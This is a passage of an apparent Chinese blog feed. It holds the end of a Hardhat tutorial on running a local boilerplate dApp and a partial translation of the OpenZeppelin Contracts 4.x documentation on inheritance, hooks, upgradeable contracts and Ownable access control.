是唯一有业务逻辑的文件。如果您将其用作模板，您可以在此处用您自己的代码替换代码</li><li>其他所有组件都只呈现 HTML，没有逻辑。</li><li><code>src/contracts</code> 有合约的 ABI 和地址，这些是由部署脚本自动生成的</li></ul></li></ul></li></ul><h3 id="如何使用它"><a href="#如何使用它" class="headerlink" title="如何使用它"></a>如何使用它</h3><p>先克隆仓库，然后准备合约部署：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> hardhat-boilerplate<span class="token function">npm</span> <span class="token function">install</span>npx hardhat <span class="token function">node</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p>在这里，我们只安装 npm 项目的依赖项，并通过运行 <code>npx hardhat node</code>，我们启动了一个 Hardhat Network 实例，您可以使用 MetaMask 连接到该实例。在同一目录中的不同终端中，运行：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">npx hardhat --network localhost run scripts/deploy.js<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>这会将合约部署到 Hardhat Network。完成后，启动 react web 应用：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> frontend<span class="token function">npm</span> <span class="token function">install</span><span class="token function">npm</span> run start<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p>然后在浏览器打开 <a href="http://127.0.0.1:3000/">http://127.0.0.1:3000/</a>，会看到连接到钱包的页面。</p><p>设置你 Metamask 中的网络至 <code>127.0.0.1:8545</code>。</p><p>单击 Web 应用程序中的按钮。会看到某个地址的合约的用户信息。</p><p>这里发生的情况是显示当前钱包余额的前端代码检测到余额为 0，因此您将无法尝试转账功能。通过运行：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">npx hardhat --network localhost faucet <span class="token operator">&lt;</span>your address<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>您将运行我们包含的自定义 Hardhat 任务，该任务使用部署帐户的余额向您的地址发送 100 MHT 和 1 ETH。这将允许您将令牌发送到另一个地址。</p><p>您可以在 <code>/tasks/faucet.js</code> 查看任务的代码，这是 <code>hardhat.config.js</code> 所必需的。</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ npx hardhat --network localhost faucet 0x0987a41e73e69f60c5071ce3c8f7e730f9a60f90Transferred <span class="token number">1</span> ETH and <span class="token number">100</span> tokens to 0x0987a41e73e69f60c5071ce3c8f7e730f9a60f90<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>在您运行 <code>npx hardhat node</code> 的终端中，您还应该看到：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">eth_sendTransaction  Contract call:       Token<span class="token comment">#transfer</span>  Transaction:         0x460526d98b86f7886cd0f218d6618c96d27de7c745462ff8141973253e89b7d4  From:                0xc783df8a850f42e7f7e57013759c285caa701eb6  To:                  0x7c2c195cd6d34b8f845992d380aadb2730bb9c6f  Value:               <span class="token number">0</span> ETH  Gas used:            <span class="token number">37098</span> of <span class="token number">185490</span>  Block <span class="token comment">#8:            0x6b6cd29029b31f30158bfbd12faf2c4ac4263068fd12b6130f5655e70d1bc257</span>  console.log:    Transferring from 0xc783df8a850f42e7f7e57013759c285caa701eb6 to 0x0987a41e73e69f60c5071ce3c8f7e730f9a60f90 <span class="token number">100</span> tokens<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>我们合约中 <code>transfer()</code> 函数的 <code>console.log</code> 输出会显示，这就是运行 faucet 任务后 Web 应用程序的样子。</p><p>尝试使用它并阅读代码。它包含了解释正在发生的事情的注释，并清楚地表明什么代码是以太坊模板以及什么是实际的 dApp 逻辑。这应该使存储库易于为您的项目重用。</p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>恭喜您完成教程！</p><p>下面是一些可能有用的链接：</p><ul><li><a href="https://github.com/NomicFoundation/hardhat-boilerplate">Hardhat’s Boilerplate</a></li><li><a href="https://hardhat.org/docs">Hardhat’s documentation site</a></li><li><a href="https://hardhat.org/hardhat-runner/plugins/nomicfoundation-hardhat-toolbox">Hardhat Toolbox’s documenation</a></li><li><a href="https://hardhat.org/discord">Hardhat Support Discord server</a></li><li><a href="https://docs.ethers.io/">Ethers.js Documentation</a></li><li><a href="https://mochajs.org/">Mocha Documentation</a></li><li><a href="https://www.chaijs.com/">Chai Documentation</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Hardhat-Tutorial-amp-Guides&quot;&gt;&lt;a href=&quot;#Hardhat-Tutorial-amp-Guides&quot; class=&quot;headerlink&quot; title=&quot;Hardhat Tutorial &amp;amp; Guides&quot;&gt;&lt;/a&gt;Har</summary>
      
    
    
    
    <category term="开发工具" scheme="https://alphafitz.com/categories/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
    
    <category term="智能合约开发" scheme="https://alphafitz.com/tags/%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%BC%80%E5%8F%91/"/>
    
    <category term="开发工具" scheme="https://alphafitz.com/tags/%E5%BC%80%E5%8F%91%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>OpenZeppelin Contracts 4.x 文档</title>
    <link href="https://alphafitz.com/2022/09/14/openzeppelin-contracts-4-docs/"/>
    <id>https://alphafitz.com/2022/09/14/openzeppelin-contracts-4-docs/</id>
    <published>2022-09-14T14:02:44.000Z</published>
    <updated>2022-10-07T04:11:34.092Z</updated>
    
    <content type="html"><![CDATA[<h1 id="OpenZeppelin-Contracts-4-x-文档"><a href="#OpenZeppelin-Contracts-4-x-文档" class="headerlink" title="OpenZeppelin Contracts 4.x 文档"></a>OpenZeppelin Contracts 4.x 文档</h1><blockquote><p>本文是对 <a href="https://docs.openzeppelin.com/contracts/4.x/">OpenZeppelin Contracts 4.x</a> 文档(截止2022.9.14)的部分翻译。</p></blockquote><h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>OpenZeppelin Contracts 是建立在经过社区审查的代码的坚实基础之上的<strong>用于安全智能合约开发的库</strong>。当前有 2.x、3.x 和 4.x 三个版本。</p><p>其包含有：</p><ul><li>ERC20 和 ERC721 等标准的实施</li><li>灵活的基于角色的许可方案</li><li>可重用的 Solidity 组件，用于构建自定义合约和复杂的去中心化系统</li></ul><p>OpenZeppelin Contracts 具有<a href="https://docs.openzeppelin.com/contracts/4.x/releases-stability#api-stability">稳定的 API</a>，这意味着合约在升级到新的次版本(minor version)时不会意外中断。</p><p>使用 <code>npm</code> 即可安装：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">npm</span> <span class="token function">install</span> @openzeppelin/contracts<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>安装后，在项目中导入库中的合约即可使用：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// contracts/MyNFT.sol</span><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"@openzeppelin/contracts/token/ERC721/ERC721.sol"</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">MyNFT</span> <span class="token keyword">is</span> ERC721 <span class="token punctuation">&#123;</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token function">ERC721</span><span class="token punctuation">(</span><span class="token string">"MyNFT"</span><span class="token punctuation">,</span> <span class="token string">"MNFT"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>如果不熟悉智能合约开发，可以前往 <a href="https://docs.openzeppelin.com/learn/developing-smart-contracts">Developing Smart Contracts</a> 来了解有关创建新项目和变异合约的信息。</p><p>为了保证系统安全，应该始终按照原样使用已安装的代码，既不要从在线资源复制粘贴，也不要执行修改。<strong>该库被设计为仅您使用的合约和函数会被部署，因此您无需担心它会不必要地增加 gas 成本。</strong></p><p>官网的 <a href="https://blog.openzeppelin.com/guides/">guides</a> 上给出了几个常见的用例和良好实践。以下文章提供了很好的阅读背景，但应注意，随着生态系统中工具继续快速发展，一些引用的工具已经发生了变化。</p><ul><li><a href="https://blog.openzeppelin.com/the-hitchhikers-guide-to-smart-contracts-in-ethereum-848f08001f05">The Hitchhiker’s Guide to Smart Contracts in Ethereum</a> 帮助您了解可用于智能合约开发的各种工具，并帮助您设置环境。</li><li><a href="https://blog.openzeppelin.com/a-gentle-introduction-to-ethereum-programming-part-1-783cc7796094">A Gentle Introduction to Ethereum Programming, Part 1</a> 提供了非常有用的介绍性信息，包括来自以太坊平台的许多基本概念。</li><li><a href="https://blog.openzeppelin.com/designing-the-architecture-for-your-ethereum-application-9cec086f8317">Designing the architecture for your Ethereum application</a> 讨论了如何更好地构建应用程序及其与现实世界的关系。</li></ul><p><a href="https://docs.openzeppelin.com/contracts/4.x/wizard">合约向导</a> 页面提供的交互式生成器可以帮助引导您的合约来了解 OpenZeppelin Contracts 中提供的组件。使用交互式生成器，可以根据多种需求来生成定制化的合约，比如可以选择 FEATURES、ACCESS CONTROL、UPGRADEABILITY 等特性。生成的合约可以使用 Hardhat 或 Truffle 等工具编译部署。</p><h2 id="Extending-Contracts"><a href="#Extending-Contracts" class="headerlink" title="Extending Contracts"></a>Extending Contracts</h2><p>大多数的 OpenZeppelin Contracts 被期望通过继承(<em><a href="https://docs.soliditylang.org/en/latest/contracts.html#inheritance">inheritance</a></em>)来使用：通过继承库中的合约来编写自己的合约。</p><p>常见的是 <code>is</code> 语法，比如 <code>contract MyToken is ERC20</code>。</p><p>NOTE：与 <code>contract</code> 不同，Solidity <code>library</code> 不是继承而是依赖于 <code>using for</code> 语法。Openzeppelin Contracts 有一些 <code>library</code>，大部分都在 <a href="https://docs.openzeppelin.com/contracts/4.x/api/utils">Utils</a> 目录中。</p><h3 id="Overriding"><a href="#Overriding" class="headerlink" title="Overriding"></a>Overriding</h3><p>继承通常用于将父合约的功能添加到自己的合约中，但这并不是它所能做的全部。还可以使用 <em>overrides</em> 来改变父合约某些部分的行为。</p><p>例如，假设想要更改 <a href="https://docs.openzeppelin.com/contracts/4.x/api/access#AccessControl">AccessControl</a> 以便不再调用 <a href="https://docs.openzeppelin.com/contracts/4.x/api/access#AccessControl-revokeRole-bytes32-address-">revokeRole</a>，可以使用 overrides 来实现：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// contracts/ModifiedAccessControl.sol</span><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"@openzeppelin/contracts/access/AccessControl.sol"</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">ModifiedAccessControl</span> <span class="token keyword">is</span> AccessControl <span class="token punctuation">&#123;</span>    <span class="token comment">// Override the revokeRole function</span>    <span class="token keyword">function</span> <span class="token function">revokeRole</span><span class="token punctuation">(</span><span class="token builtin">bytes32</span><span class="token punctuation">,</span> <span class="token builtin">address</span><span class="token punctuation">)</span> <span class="token keyword">public</span> override <span class="token punctuation">&#123;</span>        <span class="token keyword">revert</span><span class="token punctuation">(</span><span class="token string">"ModifiedAccessControl: cannot revoke roles"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>然后旧的 revokeRole 就被替换了，任何对它的调用都会立即 revert。我们无法从合约从删除(<em>remove</em>)该函数，但 revert 所有的调用就足够了。</p><h3 id="Calling-super"><a href="#Calling-super" class="headerlink" title="Calling super"></a>Calling <code>super</code></h3><p>有时想要 <em>extend</em> 父合约的行为，而不是将其更改为其他行为，就需要用到 <code>super</code>。</p><p><code>super</code> 关键字允许您调用父合约中定义的函数，即使它被覆盖(overridden)。该机制可用于向函数添加额外的检查、发出事件或以其他方式添加您认为合适的功能。</p><p>TIP：有关 overrides 如何工作的信息，请参阅 <a href="https://solidity.readthedocs.io/en/latest/contracts.html#index-17">Solidity 官方文档</a>。</p><p>下面是 <a href="https://docs.openzeppelin.com/contracts/4.x/api/access#AccessControl"><code>AccessControl</code></a> 的修改版本，其中 <a href="https://docs.openzeppelin.com/contracts/4.x/api/access#AccessControl-revokeRole-bytes32-address-"><code>revokeRole</code></a> 不能用于 revoke DEFAULT_ADMIN_ROLE：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// contracts/ModifiedAccessControl.sol</span><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"@openzeppelin/contracts/access/AccessControl.sol"</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">ModifiedAccessControl</span> <span class="token keyword">is</span> AccessControl <span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">revokeRole</span><span class="token punctuation">(</span><span class="token builtin">bytes32</span> role<span class="token punctuation">,</span> <span class="token builtin">address</span> account<span class="token punctuation">)</span> <span class="token keyword">public</span> override <span class="token punctuation">&#123;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span>            role <span class="token operator">!=</span> DEFAULT_ADMIN_ROLE<span class="token punctuation">,</span>            <span class="token string">"ModifiedAccessControl: cannot revoke default admin role"</span>        <span class="token punctuation">)</span><span class="token punctuation">;</span>        super<span class="token punctuation">.</span><span class="token function">revokeRole</span><span class="token punctuation">(</span>role<span class="token punctuation">,</span> account<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>最后的 <code>super.revokeRole</code> 语句将调用 <code>AccessControl</code> 的原始版本的 <code>revokeRole</code>，如果没有 override 那么相同的代码会运行。</p><p>NOTE：从 v3.0.0 开始，<code>view</code> 函数在 OpenZeppelin 中不是 <code>virtual</code>，因此不能被覆盖。我们正在考虑在即将发布的版本中<a href="https://github.com/OpenZeppelin/openzeppelin-contracts/issues/2154">取消此限制</a>。</p><h3 id="Using-Hooks"><a href="#Using-Hooks" class="headerlink" title="Using Hooks"></a>Using Hooks</h3><p>有时，为了扩展父合约，需要覆盖多个相关函数，这会导致代码重复并增加 bug 的可能性。</p><p>例如，考虑以 <a href="https://docs.openzeppelin.com/contracts/4.x/api/token/ERC721#IERC721Receiver"><code>IERC721Receiver</code></a> 的方式实现安全的 <a href="https://docs.openzeppelin.com/contracts/4.x/api/token/ERC20#ERC20"><code>ERC20</code></a> transfer。您可能认为覆盖 <a href="https://docs.openzeppelin.com/contracts/4.x/api/token/ERC20#ERC20-transfer-address-uint256-"><code>transfer</code></a> 和 <a href="https://docs.openzeppelin.com/contracts/4.x/api/token/ERC20#ERC20-transferFrom-address-address-uint256-"><code>transferFrom</code></a> 就足够了，但是 <a href="https://docs.openzeppelin.com/contracts/4.x/api/token/ERC20#ERC20-_transfer-address-address-uint256-"><code>_transfer</code></a> 和 <a href="https://docs.openzeppelin.com/contracts/4.x/api/token/ERC20#ERC20-_mint-address-uint256-"><code>_mint</code></a> 呢？为了避免你不得不处理这些细节，我们引入了钩子(<em><strong>hooks</strong></em>)。</p><p>Hooks 只是在某些操作发生之前或之后调用的函数。它们提供了一个集中的点来钩入(<em>hook into</em>)和扩展原始行为。</p><p>以下是在 <code>ERC20</code> 中使用 <a href="https://docs.openzeppelin.com/contracts/4.x/api/token/ERC20#ERC20-_beforeTokenTransfer-address-address-uint256-"><code>_beforeTokenTransfer</code></a> 实现 <code>IERC721Receiver</code> 模式的方法：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"@openzeppelin/contracts/token/ERC20/ERC20.sol"</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">ERC20WithSafeTransfer</span> <span class="token keyword">is</span> ERC20 <span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">_beforeTokenTransfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span> <span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span>        <span class="token keyword">internal</span> virtual override    <span class="token punctuation">&#123;</span>        super<span class="token punctuation">.</span><span class="token function">_beforeTokenTransfer</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">,</span> to<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token function">_validRecipient</span><span class="token punctuation">(</span>to<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"ERC20WithSafeTransfer: invalid recipient"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">_validRecipient</span><span class="token punctuation">(</span><span class="token builtin">address</span> to<span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token keyword">view</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">&#125;</span>    <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>以这种方式使用钩子会使代码更干净、更安全，而不必依赖对父合约内部的深入了解。</p><p>NOTE：Hooks 是 OpenZeppelin Contracts v3.0.0 的新功能，我们渴望了解您打算如何使用它们！到目前为止，唯一可用的钩子是 <code>_beforeTransferHook</code>，在所有的<a href="https://docs.openzeppelin.com/contracts/4.x/api/token/ERC20#ERC20-_beforeTokenTransfer-address-address-uint256-"><code>ERC20</code></a>, <a href="https://docs.openzeppelin.com/contracts/4.x/api/token/ERC721#ERC721-_beforeTokenTransfer-address-address-uint256-"><code>ERC721</code></a>, <a href="https://docs.openzeppelin.com/contracts/4.x/api/token/ERC777#ERC777-_beforeTokenTransfer-address-address-address-uint256-"><code>ERC777</code></a> 和 <a href="https://docs.openzeppelin.com/contracts/4.x/api/token/ERC1155#ERC1155-_beforeTokenTransfer-address-address-address-uint256---uint256---bytes-"><code>ERC1155</code></a> 中。</p><h4 id="Rules-of-Hooks"><a href="#Rules-of-Hooks" class="headerlink" title="Rules of Hooks"></a>Rules of Hooks</h4><p>为了防止在编写使用钩子的代码出现问题，您应该遵循一些准则。它们非常简单，但请确保您遵循它们：</p><ol><li>每当您覆盖(override)父合约的钩子时，将 <code>virtual</code> 属性重新应用于钩子。这将允许子合约向钩子添加更多的功能。</li><li>总是在你的覆盖中使用 <code>super</code> 调用父合约的钩子。这将确保调用继承树中的所有钩子：像 <a href="https://docs.openzeppelin.com/contracts/4.x/api/token/ERC20#ERC20Pausable"><code>ERC20Pausable</code></a> 这样的合约依赖于这种行为。</li></ol><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">contract</span> <span class="token class-name">MyToken</span> <span class="token keyword">is</span> ERC20 <span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">_beforeTokenTransfer</span><span class="token punctuation">(</span><span class="token builtin">address</span> <span class="token keyword">from</span><span class="token punctuation">,</span> <span class="token builtin">address</span> to<span class="token punctuation">,</span> <span class="token builtin">uint256</span> amount<span class="token punctuation">)</span>        <span class="token keyword">internal</span> virtual override <span class="token comment">// Add virtual here!</span>    <span class="token punctuation">&#123;</span>        super<span class="token punctuation">.</span><span class="token function">_beforeTokenTransfer</span><span class="token punctuation">(</span><span class="token keyword">from</span><span class="token punctuation">,</span> to<span class="token punctuation">,</span> amount<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// Call parent hook</span>        <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h2 id="Using-with-Upgrades"><a href="#Using-with-Upgrades" class="headerlink" title="Using with Upgrades"></a>Using with Upgrades</h2><p>如果您的合约要部署可升级，例如使用 <a href="https://docs.openzeppelin.com/upgrades-plugins/1.x/">OpenZeppelin Upgrades Plugins</a>，您将需要使用 OpenZeppelin Contracts 的可升级变体。</p><p>此变体可作为名为 <code>@openzeppelin/contracts-upgradeable</code> 的单独包提供，该软件包托管在仓库 <a href="https://github.com/OpenZeppelin/openzeppelin-contracts-upgradeable">OpenZeppelin&#x2F;openzeppelin-contracts-upgradeable</a> 中。</p><p>它遵循 <a href="https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable">编写可升级合约</a> 的所有规则：构造函数替换为初始化函数，状态变量在初始化函数中初始化，我们还检查次要版本之间的存储不兼容性。</p><h3 id="Overview-1"><a href="#Overview-1" class="headerlink" title="Overview"></a>Overview</h3><p>使用 <code>npm</code> 命令安装：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">npm</span> <span class="token function">install</span> @openzeppelin/contracts-upgradeable<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>这个包复制了主 OpenZeppelin Contracts 包结构，但每个文件和合约都有后缀 <code>Upgradeable</code>。</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token operator">-</span><span class="token keyword">import</span> <span class="token string">"@openzeppelin/contracts/token/ERC721/ERC721.sol"</span><span class="token punctuation">;</span><span class="token operator">+</span><span class="token keyword">import</span> <span class="token string">"@openzeppelin/contracts-upgradeable/token/ERC721/ERC721Upgradeable.sol"</span><span class="token punctuation">;</span><span class="token operator">-</span><span class="token keyword">contract</span> <span class="token class-name">MyCollectible</span> <span class="token keyword">is</span> ERC721 <span class="token punctuation">&#123;</span><span class="token operator">+</span><span class="token keyword">contract</span> <span class="token class-name">MyCollectible</span> <span class="token keyword">is</span> ERC721Upgradeable <span class="token punctuation">&#123;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>构造函数被内部初始化函数替换，遵循命名约定 <code>__&#123;ContractName&#125;_init</code>。由于这些是 internal，因此您必须始终定义自己的公共初始化函数(public initializer function) 并调用您扩展的合约的父合约初始化程序。</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token operator">-</span>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token function">ERC721</span><span class="token punctuation">(</span><span class="token string">"MyCollectible"</span><span class="token punctuation">,</span> <span class="token string">"MCO"</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span><span class="token operator">+</span>    <span class="token keyword">function</span> <span class="token function">initialize</span><span class="token punctuation">(</span><span class="token punctuation">)</span> initializer <span class="token keyword">public</span> <span class="token punctuation">&#123;</span><span class="token operator">+</span>        <span class="token function">__ERC721_init</span><span class="token punctuation">(</span><span class="token string">"MyCollectible"</span><span class="token punctuation">,</span> <span class="token string">"MCO"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>CAUTION：与多重继承一起使用需要特别注意。请参阅下面标题为<a href="https://docs.openzeppelin.com/contracts/4.x/upgradeable#multiple-inheritance">多重继承</a>的部分。</p><h3 id="Further-Notes"><a href="#Further-Notes" class="headerlink" title="Further Notes"></a>Further Notes</h3><h4 id="Multiple-Inheritance"><a href="#Multiple-Inheritance" class="headerlink" title="Multiple Inheritance"></a>Multiple Inheritance</h4><p>初始化函数不像构造函数那样被编译器线性化。因此，每个 <code>__&#123;ContractName&#125;_init</code> 函数都将线性化调用嵌入到了所有父合约初始化函数中。因此，调用其中两个 <code>init</code> 函数可能会初始化同一个合约两次。</p><p>每个合约中的 <code>__&#123;ContractName&#125;_init_unchained</code> 函数是初始化函数减去对父合约初始化函数的调用，可用于避免双重初始化问题，但不建议手动执行此操作。我们希望能够在 Upgrades Plugins 的未来版本中对此进行安全检查。</p><h4 id="Storage-Gaps"><a href="#Storage-Gaps" class="headerlink" title="Storage Gaps"></a>Storage Gaps</h4><p>您可能会注意到每个合约都包含一个名为 <code>__gap</code> 的状态变量。这是在可升级合约中放置的存储(sotrage)中的空的保留空间。它允许我们在未来自由添加新的状态变量，而不会影响与现有部署的存储兼容性。</p><p>简单地添加一个状态变量是不安全的，因为它会“向下移动(shifts down)”继承链中下面的所有状态变量。这使得存储布局不兼容，如 <a href="https://docs.openzeppelin.com/upgrades-plugins/1.x/writing-upgradeable#modifying-your-contracts">Writing Upgradeable Contracts</a> 中所述。计算 <code>__gap</code> 数组的大小，以便合约使用的存储量加起来总是相同的数字（在本例中为 50 storage slots）。</p><h2 id="Access-Control"><a href="#Access-Control" class="headerlink" title="Access Control"></a>Access Control</h2><p>访问控制——即“谁被允许做这件事”—— 在智能合约的世界中非常重要。你的合约的访问控制可以控制谁可以铸造代币、对提案进行投票、冻结转账和许多其他事情。因此，了解您如何实现它<strong>至关重要</strong>，以免其他人<a href="https://blog.openzeppelin.com/on-the-parity-wallet-multisig-hack-405a8c12e8f7">窃取您的整个系统</a>。</p><h3 id="Ownership-and-Ownable"><a href="#Ownership-and-Ownable" class="headerlink" title="Ownership and Ownable"></a>Ownership and <code>Ownable</code></h3><p>最常见和最基本的访问控制形式是所有权(<em>ownership</em>)的概念：有一个账户是合约的 <code>owner</code>，可以对其执行管理任务。这种方法对于只有一个管理用户的合约来说是完全合理的。</p><p>OpenZeppelin Contracts 提供 <a href="https://docs.openzeppelin.com/contracts/4.x/api/access#Ownable"><code>Ownable</code></a> 用于在您的合约中实现所有权。</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token comment">// contracts/MyContract.sol</span><span class="token comment">// SPDX-License-Identifier: MIT</span><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token string">"@openzeppelin/contracts/access/Ownable.sol"</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">MyContract</span> <span class="token keyword">is</span> Ownable <span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function">normalThing</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// anyone can call this normalThing()</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function">specialThing</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> onlyOwner <span class="token punctuation">&#123;</span>        <span class="token comment">// only the owner can call specialThing()!</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>默认情况下，Ownable 合约的 <a href="https://docs.openzeppelin.com/contracts/4.x/api/access#Ownable-owner--"><code>owner</code></a> 是部署它的帐户，这通常正是您想要的。</p><p>Ownable 还可以让您：</p><ul><li><a href="https://docs.openzeppelin.com/contracts/4.x/api/access#Ownable-transferOwnership-address-"><code>transferOwnership</code></a> 从所有者账户到新账户，以及</li><li><a href="https://docs.openzeppelin.com/contracts/4.x/api/access#Ownable-renounceOwnership--"><code>renounceOwnership</code></a> 让所有者放弃此管理特权，这是集中管理初始阶段结束后的常见模式。</li></ul><p>WARNING：完全删除所有者将意味着受 <code>onlyOwner</code> 保护的管理任务将不再可调用！</p><p>请注意，<strong>一个合约也可以是另一个合约的所有者</strong>！例如，这为使用 <a href="https://gnosis-safe.io/">Gnosis Safe</a>、<a href="https://aragon.org/">Aragon 